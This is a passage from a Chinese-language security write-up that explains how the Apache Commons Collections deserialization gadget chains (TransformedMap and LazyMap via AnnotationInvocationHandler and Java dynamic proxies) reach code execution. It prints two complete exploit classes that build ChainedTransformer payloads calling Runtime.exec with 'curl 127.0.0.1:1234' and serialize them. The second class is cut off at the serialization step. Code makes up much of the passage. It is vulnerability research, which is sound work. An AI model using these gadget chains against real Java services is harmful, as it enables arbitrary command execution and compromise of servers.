但是要进入这个触发点，还需要满足`!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)`
通过代码可以知道var7 =
(Class)var3.get(var6),其中var3=var2.memberTypes(),然后var2=AnnotationType.getInstance(this.type),而this.type是可控的，构造函数如下(jdk1.7版本是这样，jdk1.6更简单，直接赋值没啥好分析的，我贴在下面了)：
    AnnotationInvocationHandler(Class var1, Map var2) {
            Class[] var3 = var1.getInterfaces();
            if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
                this.type = var1;
                this.memberValues = var2;
            } else {
                throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
            }
        }
    //jdk1.6版本是这样，没过滤更简单
    AnnotationInvocationHandler(Class var1, Map var2) {
        this.type = var1;
        this.memberValues = var2;
    }
现在看一下jdk1.7的过滤条件，要求是`Annotation`类的子类，Annotation这个接口是所有注解类型的公用接口，所有注解类型应该都是实现了这个接口的，在exp里用的是`java.lang.annotation.Retention.class`这个类，总的exp如下，这里最后模拟了一下序列化和返序列化的过程
#### 4.4.4 TransformedMap的exploit
本地测试的exp代码是
    package src.main.java;
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsExp {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers_exec = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"curl 127.0.0.1:1234"})
            };
            Transformer chain = new ChainedTransformer(transformers_exec);
            HashMap innerMap = new HashMap();
            innerMap.put("keykey", "vv");
            Map outerMap = TransformedMap.decorate(innerMap, null, chain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
    //        FileOutputStream fos = new FileOutputStream("./poc.ser");
    //        ObjectOutputStream oos = new ObjectOutputStream(fos);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(ins);
            oos.flush();
            oos.close();
            // 本地模拟反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object obj = (Object) ois.readObject();
        }
    }
#### 4.4.5 LazyMap
再看LazyMap中调用transform方法的地方
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
调用了`this.factory.transfrom`，而`this.factory`由构造函数指定
    protected final Transformer factory;
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
构造poc时只要让给`LazyMap`的第二个参数传入一个`ChainedTransformer`类型对象即可。下一步是找在哪里调用这个get方法，
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);
            } else if (var5.length != 0) {
                throw new AssertionError("Too many parameters for an annotation method");
            } else {
                byte var7 = -1;
                switch(var4.hashCode()) {
                case -1776922004:
                    if (var4.equals("toString")) {
                        var7 = 0;
                    }
                    break;
                case 147696667:
                    if (var4.equals("hashCode")) {
                        var7 = 1;
                    }
                    break;
                case 1444986633:
                    if (var4.equals("annotationType")) {
                        var7 = 2;
                    }
                }
                switch(var7) {
                case 0:
                    return this.toStringImpl();
                case 1:
                    return this.hashCodeImpl();
                case 2:
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);
                    if (var6 == null) {
                        throw new IncompleteAnnotationException(this.type, var4);
                    } else if (var6 instanceof ExceptionProxy) {
                        throw ((ExceptionProxy)var6).generateException();
                    } else {
                        if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                            var6 = this.cloneArray(var6);
                        }
                        return var6;
                    }
                }
            }
        }
在`AnnotationInvocationHandler`类的`invoke`方法中，有`this.memberValues.get(var4);`，而`this.memberValues`在构造函数中赋值
    AnnotationInvocationHandler(Class var1, Map var2) {
        this.type = var1;
        this.memberValues = var2;
    }
所以只要在构造函数的第二个参数传LazyMap类型即可，接下来的问题是，如何调用这个`invoke`方法呢？这就要利用到java的动态代理，参考[这篇文章](https://www.cnblogs.com/tr1ple/p/12260664.html)
> 总结为一句话就是，被动态代理的对象调用任意方法都会通过对应的InvocationHandler的invoke方法触发
引用参考文章8的里的这一段
>
> 只要创建一个LazyMap的动态代理，然后再用动态代理调用LazyMap的某个方法就行了，但是为了反序列化的时候自动触发，我们应该找的是某个重写了readObject方法的类，这个类的readObject方法中可以通过动态代理调用LazyMap的某个方法，其实这和直接调用LazyMap某个方法需要满足的条件几乎是一样的，因为某个类的动态代理与它本身实现了同一个接口。而我们通过分析TransformedMap利用链的时候，已经知道了在AnnotationInvocationHandler的readObject方法中会调用某个Map类型对象的entrySet()方法，而LazyMap以及他的动态代理都是Map类型，所以，一条利用链就这么出来了：
    package src.main.java;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.eclipse.persistence.internal.xr.Invocation;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsExp2 {
        public static void main(String[] args) throws Exception{
            Transformer[] transformers_exec = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"curl 127.0.0.1:1234"})
            };
            Transformer chain = new ChainedTransformer(transformers_exec);
            HashMap innerMap = new HashMap();
            innerMap.put("keykey","vv");
            Map lazyMap = LazyMap.decorate(innerMap,chain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
            cons.setAccessible(true);
            // 创建LazyMap的handler实例
            InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);
            // 创建LazyMap的动态代理实例
            Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);
            // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues
            InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);
            // 序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);